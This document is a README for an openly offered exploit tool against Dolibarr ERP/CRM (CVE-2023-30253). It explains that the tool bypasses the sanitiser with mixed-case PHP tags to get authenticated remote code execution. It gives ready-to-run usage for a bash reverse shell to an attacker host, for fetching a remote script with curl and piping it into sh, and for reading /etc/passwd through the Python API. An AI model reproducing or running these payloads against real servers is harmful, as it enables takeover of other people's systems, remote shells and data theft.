# DolibabyPhp

An authenticated RCE exploit for Dolibarr ERP/CRM CVE-2023-30253.

## Installation

You can either install the package from the PyPi repository with `pip` or `git clone` the source directly from GitHub.

```shell
pip install dolibabyphp
```

## Usage

```txt
Usage: dolibabyphp [OPTIONS] TARGET_URL USERNAME PASSWORD COMMAND [ARGS]...

  This exploit will log into the Dolibarr web server at the specified target URL
  with the provided username and password. After that it will attempt to create
  a web page with a unique name. Once created, it will modify the web page to
  include the custom PHP code bypassing the sanitation check by not using only
  lowercase letters (e.g. PHP or pHp instead of php). There are multiple
  payloads to choose from After the payload has finished running, the web page
  will be deleted.

Options:
  --site-name TEXT       Specify a name to use when creating a site on the
                         target. Defaults to UUIDv4.
  --page-name TEXT       Specify a name to use when creating a page on the
                         target. Defaults to UUIDv4.
  --page-title TEXT      Specify a title for the page. Defaults to the page
                         name.
  --proxy TEXT           Specify a proxy URL for use in all requests.
  -o, --output FILENAME  Specify a file path to output the results of the
                         payload to. Defaults to stdout.
  -h, --help             Show this message and exit.

Commands:
  bash-reverse-shell     Spawns a bash shell on the victim machine and...
  cleanup                Runs the cleanup script on the target for given site...
  curl-pipe              Curl a file and pipe it to another command.
  custom-php-payload     Specify your own PHP payload to be run on the victim...
  custom-system-payload  Specify your own payload to be run via PHP system()...
  sftp                   SFTPs to the attacker machine, downloads the...
  wget                   Downloads the file at the specified URL to to the...
```

### Examples

Here are some examples of how to use the CLI.

```shell
# Reverse shell with Bash.
dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444

# Custom payload with a proxy.
dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"

# SFTP and execute payload with output written to a file.
dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css

# Curl payload and pipe it to sh.
dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 curl-pipe https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

### From Python

If you want to integrate this exploit into another Python project, you can just import it.

```python
from dolibabyphp import Exploit, furl, php_system, open_file, cleanup_site
from time import sleep

exploit = Exploit(
  target_url=furl('http://example.com'),
  username="username1",
  password="pass_word23",
)

# You can get the result of the payload directly from the exploit.
result = exploit.run(php_system('cat /etc/passwd'))
users = list(map(lambda acct: acct.split(':')[0], result.output.split('\n')))

# If cleanup fails, we can just try again.
while not result.cleaned_up:
  time.sleep(30) # wait a bit before trying cleanup again
  result.cleanup()

# You can also have it write the result to a file.
with open_file('./exploit-output.txt', 'w', lazy=True) as file:
  # You can reuse the same Exploit instance.
  exploit.output = file
  # The site_name and page_name do not change automatically.
  result = exploit.run(php_system('curl http://1.2.3.4/myscript.sh | sh'))
```

## Running from source

In order to run the project from the source code, you can either use `rye run` or make sure you add the `src/` directory to the `PYTHONPATH` and then import the module `dolibabyphp` with the `-m` flag.

```shell
# With rye
rye run dolibabyphp

# Without rye
PYTHONPATH="$(pwd)/src/" python -m dolibabyphp
```
